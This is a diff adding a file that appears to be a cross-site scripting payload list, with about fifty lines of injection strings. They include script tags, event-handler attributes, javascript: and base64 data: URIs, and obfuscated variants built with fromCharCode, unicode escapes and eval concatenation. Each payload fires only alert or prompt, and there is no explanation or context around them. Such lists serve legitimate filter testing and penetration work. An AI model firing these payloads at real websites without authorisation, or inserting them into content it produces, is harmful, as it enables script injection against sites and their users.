@@ -1,0 +1,50 @@
+<script>alert(document.domain)</script>
+<img src="x" onerror="alert('XSS')"/>
+<svg onload="alert('XSS')"/>
+'><script>alert('XSS')</script>
+javascript:alert('XSS')
+<iframe src="javascript:alert('XSS');"></iframe>
+<input type="text" onfocus="alert('XSS')"/>
+<div onmouseover="alert('XSS')">Hover over me!</div>
+<a href="javascript:alert('XSS')">Click me</a>
+<body onload=alert('XSS')>
+<embed src="javascript:alert('XSS');">
+<object data="javascript:alert('XSS');"></object>
+<svg onload='this["\u006F\u006E\u0065\u0072\u0072\u006F\u0072"]=prompt(9)'></svg>
+';alert(String.fromCharCode(88,83,83))//
+";alert(String.fromCharCode(88,83,83))//
+<img src=x onerror=eval('al'+'ert(9)');>
+<iframe/src="javascript:prompt(9);">
+<object type="text/x-scriptlet" data="javascript:prompt(9);"></object>
+<embed src="javascript:prompt(9);" type="application/x-shockwave-flash">
+<body onload=prompt(9)>
+<input type="image" src="x" onerror="prompt(9);">
+<form action="javascript:prompt(9)"><input type="submit"></form>
+<a href="javascript:prompt(9)">Click me</a>
+<div style="x:expression(prompt(9))">
+<meta http-equiv="refresh" content="0;url=javascript:prompt(9);">
+<xml id="xss" src="javascript:prompt(9);"></xml>
+<iframe srcdoc="<script>prompt(9)</script>"></iframe>
+<marquee onstart=prompt(9)>
+<keygen autofocus onfocus=prompt(9)>
+<video><source onerror="prompt(9);"></video>
+<audio src="x" onerror="prompt(9);"></audio>
+<style>@import 'javascript:prompt(9)';</style>
+<svg><script>alert('XSS')%26%239;</script></svg>
+<form action="javascript:alert('XSS')"><input type="submit"/></form>
+<marquee onstart="alert('XSS')">XSS</marquee>
+<video><source onerror="alert('XSS')"></video>
+<audio src="x" onerror="alert('XSS');"></audio>
+<style>@import 'javascript:alert("XSS")';</style>
+<img src="x" style="background:url(javascript:alert('XSS'))"/>
+<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="alert('XSS')"></div>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+">XSS</a>
+<iframe src="data:text/html,%3Cscript%3Ealert('XSS')%3C/script%3E"></iframe>
+<table background="javascript:alert('XSS')"><tr><td>Test</td></tr></table>
+<td style="filter: url('data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+');">XSS</td>
+<xml id="xss" src="javascript:alert('XSS');"></xml>
+<link rel="stylesheet" href="javascript:alert('XSS');">
+<base href="javascript:alert('XSS');//">
+<body background="javascript:alert('XSS')">
+<bgsound src="javascript:alert('XSS');">
+<br size="&{alert('XSS')}">
